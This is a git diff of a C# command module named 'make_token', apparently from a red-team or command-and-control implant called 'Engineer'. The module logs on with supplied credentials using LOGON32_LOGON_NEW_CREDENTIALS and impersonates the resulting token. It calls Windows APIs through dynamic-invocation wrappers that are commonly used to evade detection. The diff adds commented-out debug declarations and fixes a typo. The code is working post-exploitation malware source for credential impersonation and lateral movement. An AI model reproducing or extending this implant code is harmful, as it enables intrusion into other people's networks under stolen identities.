@@ -1,14 +1,27 @@
 ﻿using System;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading.Tasks;
 using DynamicEngLoading;
+using static DynamicEngLoading.h_DynInv.Win32.Advapi32;
 
 
 namespace Engineer.Commands
 {
     internal class Make_Token : EngineerCommand
     {
+        ////DEBUG TESTING 
+        //[DllImport("advapi32.dll")]
+        //public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, h_DynInv.Win32.Advapi32.LOGON_TYPE dwlogonType, h_DynInv.Win32.Advapi32.LOGON_PROVIDER dwlogonProvider, out IntPtr phToken);
+
+        //[DllImport("advapi32.dll")]
+        //public static extern bool RevertToSelf();
+
+        //[DllImport("Advapi32.dll")]
+        //public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+        ////END DEBUG TESTING
+
         public override string Name => "make_token";
 
         public override async Task Execute(EngineerTask task)
@@ -63,8 +76,10 @@ namespace Engineer.Commands
                 }
 
                 if (h_DynInv_Methods.AdvApi32FuncWrapper.LogonUser(username, domain, password, h_DynInv.Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS, h_DynInv.Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out IntPtr hToken))
+                //if (LogonUser(username, domain, password, h_DynInv.Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS, h_DynInv.Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out IntPtr hToken))
                 {
                     if (h_DynInv_Methods.AdvApi32FuncWrapper.ImpersonateLoggedOnUser(hToken))
+                    //if (ImpersonateLoggedOnUser(hToken))
                     {
                         WindowsIdentity identity = new WindowsIdentity(hToken);
                         try
@@ -83,7 +98,7 @@ namespace Engineer.Commands
                             return;
                         }
                     }
-                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "created token but Failed to imersonate user", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "created token but Failed to impersonate user", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                     return;
                 }
                 ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Failed to make token", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
